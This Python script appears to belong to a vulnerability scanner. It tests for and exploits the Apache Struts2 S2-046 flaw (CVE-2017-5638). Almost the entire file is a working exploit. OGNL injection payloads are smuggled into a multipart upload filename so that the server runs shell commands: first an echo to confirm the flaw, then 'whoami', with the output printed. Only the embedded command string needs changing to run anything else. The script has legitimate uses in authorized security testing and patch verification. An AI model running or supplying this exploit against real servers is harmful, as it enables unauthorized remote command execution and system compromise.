#!/usr/bin/env python3

'''
name: Struts2 S2-046漏洞，又名CVE-2017-5638漏洞
description: Struts2 S2-046漏洞可执行任意命令
'''

import re
import urllib
from app.lib.utils.common import get_capta
from app.lib.utils.request import request

class S2_046_BaseVerify:
    def __init__(self, url):
        self.url = url
        self.capta = get_capta()
        self.headers = {
                   'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 115Browser/6.0.3",
                   'Content-Type': 'multipart/form-data; boundary=---------------------------735323031399963166993862150'
        }
        self.check_payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo " + self.capta + '\'' + ").(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        self.check_data = "-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"" + self.check_payload + "\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--"
        self.cmd_payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        self.cmd_data = "-----------------------------735323031399963166993862150\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"" + self.cmd_payload + "\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n-----------------------------735323031399963166993862150--"
    
    def run(self):
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        try:
            check_req = request.post(self.url, headers = self.headers, data = self.check_data)
            if self.capta in check_req.text:
                cmd_req = request.post(self.url, headers = self.headers, data = self.cmd_data)
                print('存在S2-046漏洞,执行whoami命令成功，结果为：', cmd_req.text)
                return True
            else:
                print('不存在S2-046漏洞!')
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_046 = S2_046_BaseVerify('http://192.168.30.242:8080/doUpload.action')
    S2_046.run()
